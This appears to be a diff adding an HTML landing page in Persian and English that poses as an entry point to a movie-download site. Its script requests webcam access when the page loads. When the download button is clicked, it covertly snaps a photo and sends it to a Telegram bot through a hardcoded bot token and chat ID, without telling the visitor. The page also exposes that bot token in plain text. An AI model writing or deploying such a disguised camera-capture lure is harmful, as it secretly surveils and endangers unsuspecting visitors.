@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome to Your Site</title>
+  <style>
+    /* General Styles */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Arial', sans-serif;
+      color: white;
+      overflow: hidden;
+    }
+
+    /* Background Animation */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://cdn.pixabay.com/photo/2017/08/30/10/02/space-2691098_960_720.jpg') no-repeat center center/cover;
+      animation: moveStars 20s linear infinite;
+      z-index: -1;
+    }
+
+    @keyframes moveStars {
+      0% {
+        background-position: 0 0;
+      }
+      100% {
+        background-position: -1000px -1000px;
+      }
+    }
+
+    .container {
+      text-align: center;
+      padding: 50px;
+    }
+
+    h1 {
+      font-size: 4em;
+      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
+      margin-bottom: 20px;
+    }
+
+    .subtitle {
+      font-size: 1.5em;
+      margin-bottom: 30px;
+      color: #00ff00;
+    }
+
+    /* Buttons */
+    .btn {
+      padding: 15px 30px;
+      font-size: 1.2em;
+      color: #fff;
+      background: linear-gradient(145deg, #00ff00, #006600);
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s ease-in-out;
+      margin: 10px;
+    }
+
+    .btn:hover {
+      background: linear-gradient(145deg, #006600, #00ff00);
+      transform: scale(1.1);
+      box-shadow: 0 10px 30px rgba(0, 255, 0, 0.6);
+    }
+
+    /* Language Toggle */
+    .lang-btn {
+      background: linear-gradient(145deg, #ffcc00, #cc9900);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1 id="title">با ستاره‌ها</h1>
+    <p class="subtitle" id="subtitle">به منو و صفحه فرعی خوش آمدید</p>
+    <button id="langToggle" class="btn lang-btn">CHANGE TO ENGLISH</button>
+    <br>
+    <button id="capture" class="btn">ورود به سایت اصلی برای دانلود فیلم</button>
+  </div>
+
+  <script>
+    // Language toggle functionality
+    const title = document.getElementById('title');
+    const subtitle = document.getElementById('subtitle');
+    const langToggle = document.getElementById('langToggle');
+    let isEnglish = false;
+
+    langToggle.addEventListener('click', () => {
+      if (isEnglish) {
+        title.textContent = "با ستاره‌ها";
+        subtitle.textContent = "به منو و صفحه فرعی خوش آمدید";
+        langToggle.textContent = "CHANGE TO ENGLISH";
+        isEnglish = false;
+      } else {
+        title.textContent = "With the Stars";
+        subtitle.textContent = "Welcome to the menu and subpage";
+        langToggle.textContent = "تغییر به فارسی";
+        isEnglish = true;
+      }
+    });
+
+    // Capture photo functionality
+    const video = document.createElement('video');
+    const canvas = document.createElement('canvas');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        video.play();
+      })
+      .catch(err => console.error("Webcam error:", err));
+
+    document.getElementById('capture').addEventListener('click', () => {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const photoData = canvas.toDataURL('image/png'); // Convert photo to Base64
+      const telegramToken = '7873624812:AAEAuInBku4J4GjSBG62Qw3hAXtyGTIwObw'; // Bot token
+      const chatId = '1426493835'; // Chat ID
+
+      fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+        method: 'POST',
+        body: JSON.stringify({
+          chat_id: chatId,
+          photo: photoData,
+        }),
+        headers: {
+          'Content-Type': 'application/json',
+        },
+      })
+        .then(res => res.json())
+        .then(data => console.log("Photo sent successfully:", data))
+        .catch(err => console.error("Error sending photo:", err));
+    });
+  </script>
+</body>
+</html>
+
